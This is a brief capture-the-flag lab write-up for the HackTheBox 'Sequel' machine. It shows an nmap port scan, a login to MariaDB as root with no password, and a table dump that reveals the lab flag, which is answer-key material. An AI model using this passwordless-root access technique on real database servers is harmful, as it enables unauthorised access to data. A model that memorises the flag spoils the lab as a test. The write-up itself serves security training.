# [HackTheBox] [Sequel]: [Enumeration], [Foothold]

**Target:** [Sequel] | **OS:** Linux | **Difficulty:** Super Easy  
**Attack Vector:** [Enumeration -> Foothold]

---

## 1. Enumeration

```bash
sudo nmap -p- -sS ---min-rate 5000 -T3 10.129.130.73
```

`PORT     STATE SERVICE
3306/tcp open  mysql`

![Image](https://raw.githubusercontent.com/zyoel/writeups/main/htb/sequel/assets/search.png)

## 2. Foothold

```shell
➜ mariadb -h 10.129.130.73 -u root --ssl=0
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 39
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10
```

Once we are inside with the default credential


## 3. Flag 

```shell
MariaDB [(none)]> SHOW DATABASES;
MariaDB [(none)]> USE htb;
MariaDB [htb]> SHOW TABLES;
MariaDB [htb]> SELECT * FROM config;
+----+-----------------------+----------------------------------+
| id | name                  | value                            |
+----+-----------------------+----------------------------------+
|  1 | timeout               | 60s                              |
|  2 | security              | default                          |
|  3 | auto_logon            | false                            |
|  4 | max_size              | 2M                               |
|  5 | flag                  | 7b4bec00d1a39e3dd4e021ec3d915da8 |
|  6 | enable_uploads        | false                            |
|  7 | authentication_method | radius                           |
+----+-----------------------+----------------------------------+
```
